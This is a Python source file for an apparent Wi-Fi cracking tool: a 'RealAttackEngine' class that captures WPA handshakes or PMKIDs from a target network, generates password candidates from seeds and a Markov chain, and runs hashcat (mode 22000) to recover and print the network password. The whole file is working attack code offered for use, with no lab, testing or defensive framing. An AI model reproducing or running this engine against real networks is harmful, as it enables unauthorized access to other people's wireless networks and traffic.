import time
import os
import subprocess
import tempfile
import re
from core.error_handler import ErrorHandler


class RealAttackEngine:
    def __init__(self, config, error_handler):
        self.config = config
        self.error_handler = error_handler
        self.password_generator = None
        self.password_tester = None
        self.handshake_capture = None
        self.pmkid_capture = None
        self.async_engine = None
        self.performance_tracker = None
        self.hashcat_wrapper = None
        self.adaptive_engine = None
        self.hardware_optimizer = None
        self.attack_results = []

    def initialize_engine(self, hardware_optimizer=None):
        try:
            from engines.password_generator import PasswordGenerator
            from engines.password_tester import PasswordTester
            from engines.handshake_capture import HandshakeCapture
            from engines.pmkid_capture import PmkidCapture, AsyncCaptureEngine
            from engines.adaptive_engine import AdaptiveAttackEngine
            from learning.performance_tracker import PerformanceTracker
            from tools.hashcat_wrapper import HashcatWrapper

            self.hardware_optimizer = hardware_optimizer
            self.password_generator = PasswordGenerator(self.config, self.error_handler)
            self.password_tester = PasswordTester(self.config, self.error_handler)
            self.handshake_capture = HandshakeCapture(self.config, self.error_handler)
            self.pmkid_capture = PmkidCapture(self.config, self.error_handler)
            self.async_engine = AsyncCaptureEngine(
                self.config, self.error_handler,
                self.handshake_capture, self.pmkid_capture,
            )
            self.performance_tracker = PerformanceTracker(self.config)
            self.hashcat_wrapper = HashcatWrapper(self.config, self.error_handler)
            self.adaptive_engine = AdaptiveAttackEngine(
                self.config, self.error_handler,
                self.password_generator, self.password_tester,
            )

            return True
        except Exception as e:
            self.error_handler.handle_error("E300", "Real attack engine init failed", e)
            return False

    def execute_real_attack(self, target, interface="wlan0mon",
                             max_duration=3600, seeds=None):
        bssid = target.get("bssid", "")
        ssid = target.get("ssid", "?")
        channel = target.get("channel", 1)
        signal = target.get("signal_strength", -100)

        print(f"\n   TARGET: {ssid} ({bssid})")
        print(f"   Signal: {signal} dBm  |  Channel: {channel}")

        start_time = time.time()
        result = {
            "target": target,
            "success": False,
            "password": None,
            "duration": 0,
            "tested_count": 0,
            "handshake_captured": False,
            "pmkid_captured": False,
            "method": None,
            "errors": [],
        }

        try:
            existing_hs = self.handshake_capture.find_existing_handshake(bssid)
            if existing_hs:
                result["handshake_captured"] = True
                result["method"] = "existing_handshake"
                capture_result = {"type": "handshake", "file": existing_hs}
                print(f"   Using existing handshake: {existing_hs}")
            else:
                print(f"   Dual parallel capture starting (handshake + PMKID)...")
                capture_result = self.async_engine.capture_dual(
                    bssid, channel, interface, timeout=180,
                )

            if not capture_result:
                result["errors"].append("Both handshake and PMKID capture failed")
                self.performance_tracker.record_attack(target, result)
                return result

            cap_type = capture_result["type"]
            cap_file = capture_result["file"]
            result["method"] = capture_result["method"]

            if cap_type == "handshake":
                result["handshake_captured"] = True
                print(f"   Handshake captured: {cap_file}")
                found_pw, tested = self._crack_handshake(
                    bssid, cap_file, target, max_duration, signal, seeds, result,
                )
            elif cap_type == "pmkid":
                result["pmkid_captured"] = True
                print(f"   PMKID captured: {cap_file}")
                found_pw, tested = self._crack_pmkid(
                    bssid, cap_file, target, max_duration, signal, seeds, result,
                )
            else:
                result["errors"].append(f"Unknown capture type: {cap_type}")
                self.performance_tracker.record_attack(target, result)
                return result

            result["success"] = found_pw is not None
            result["password"] = found_pw
            result["tested_count"] = tested
            result["duration"] = time.time() - start_time

            if found_pw:
                print(f"   CRACKED: {found_pw}")
            else:
                print(f"   Failed after {tested:,} tests")

            self.performance_tracker.record_attack(target, result)
            self.attack_results.append(result)
            return result

        except Exception as e:
            eid = self.error_handler.handle_error(
                "E300", f"Attack failed on {ssid}", e)
            result["errors"].append(f"Error {eid}: {e}")
            result["duration"] = time.time() - start_time
            return result

    def _crack_handshake(self, bssid, handshake_file, target,
                         max_duration, signal, seeds, result):
        if not self.password_tester.setup_handshake_test(handshake_file):
            result["errors"].append("Handshake setup failed")
            return None, 0

        print(f"   Cracking handshake with adaptive pipeline...")
        from intelligence.password_intelligence import PasswordIntelligence
        pi = PasswordIntelligence()

        if seeds:
            plan = pi.generate_attack_plan(target, max_duration)
            plan["seeds"] = list(dict.fromkeys(list(seeds) + plan["seeds"]))
        else:
            plan = pi.generate_attack_plan(target, max_duration)

        signal_factor = max(0.3, min(1.0, (signal + 90) / 60))
        adjusted_time = max(60, int(max_duration * signal_factor))
        plan["time_budget"] = adjusted_time

        found_pw, tested = self.adaptive_engine.execute_intelligent_crack(
            target, handshake_file, bssid, plan,
            max_tests=10000000,
        )
        return found_pw, tested

    def _crack_pmkid(self, bssid, pmkid_file, target,
                     max_duration, signal, seeds, result):
        pmkid_available = self.pmkid_capture.is_available()
        if not pmkid_available:
            print(f"   PMKID captured but hashcat not available, skipping crack")
            return None, 0

        gpu = self.hardware_optimizer.detect_gpu() if self.hardware_optimizer else {}
        use_gpu = gpu.get("available", False)
        if use_gpu:
            print(f"   Cracking PMKID with hashcat (GPU acceleration)...")
        else:
            print(f"   Cracking PMKID with hashcat (CPU)...")

        from intelligence.password_intelligence import PasswordIntelligence
        pi = PasswordIntelligence()
        plan = pi.generate_attack_plan(target, max_duration)
        if seeds:
            plan["seeds"] = list(dict.fromkeys(list(seeds) + plan["seeds"]))

        phase = plan.get("phases", [{}])[0] if plan.get("phases") else {}
        base_seeds = phase.get("seeds", plan.get("seeds", []))
        max_tests = min(5000000, int(max_duration * 5000))

        tested = 0
        found_pw = None

        for password in self._seed_generator(base_seeds, max_tests):
            if found_pw:
                break
            if tested >= max_tests:
                break

            test_result = self._test_hashcat_single(pmkid_file, password, use_gpu)
            if test_result:
                found_pw = password
                break

            tested += 1
            if tested % 10000 == 0:
                elapsed = time.time() - result.get("duration_start", time.time())
                speed = tested / elapsed if elapsed > 0 else 0
                print(f"   PMKID crack: {tested:,} tested ({speed:,.0f} p/s)", end="\r")

        return found_pw, tested

    def _seed_generator(self, seeds, max_count):
        seen = set()
        for s in seeds:
            s = s.strip()
            if s and s not in seen:
                seen.add(s)
                yield s
                if len(seen) >= max_count:
                    return

        from intelligence.password_intelligence import MarkovChain
        mc = MarkovChain()
        mc.train(seeds)

        for _ in range(max_count - len(seen)):
            pw = mc.generate()
            if pw and pw not in seen:
                seen.add(pw)
                yield pw

    def _test_hashcat_single(self, hash_file, password, use_gpu):
        try:
            with tempfile.NamedTemporaryFile(mode="w", delete=False,
                                              suffix=".txt") as f:
                f.write(password + "\n")
                f.flush()
                tmp_path = f.name

            cmd = [
                "hashcat", "-m", "22000",
                "-a", "0",
                hash_file, tmp_path,
                "--potfile-disable",
                "--runtime-limit=10",
            ]
            if use_gpu:
                cmd.extend(["-D", "2"])
            else:
                cmd.extend(["-D", "1"])
            cmd.append("--force")

            r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            os.unlink(tmp_path)

            if r.returncode == 0:
                show = subprocess.run(
                    ["hashcat", "-m", "22000", "--show", hash_file,
                     "--potfile-disable"],
                    capture_output=True, text=True, timeout=10,
                )
                if show.stdout.strip():
                    return True

            if "Cracked" in r.stdout or password in r.stdout:
                return True

            return False
        except Exception:
            return False

    def get_attack_statistics(self):
        total = len(self.attack_results)
        ok = len([r for r in self.attack_results if r["success"]])
        hc = len([r for r in self.attack_results if r.get("handshake_captured", False)])
        pm = len([r for r in self.attack_results if r.get("pmkid_captured", False)])
        tested = sum(r["tested_count"] for r in self.attack_results)
        avg_time = (sum(r["duration"] for r in self.attack_results) / total
                    if total > 0 else 0)
        return {
            "total_attacks": total,
            "successful_attacks": ok,
            "success_rate": ok / total if total > 0 else 0,
            "handshake_capture_rate": hc / total if total > 0 else 0,
            "pmkid_capture_rate": pm / total if total > 0 else 0,
            "total_tested": tested,
            "average_time": avg_time,
        }
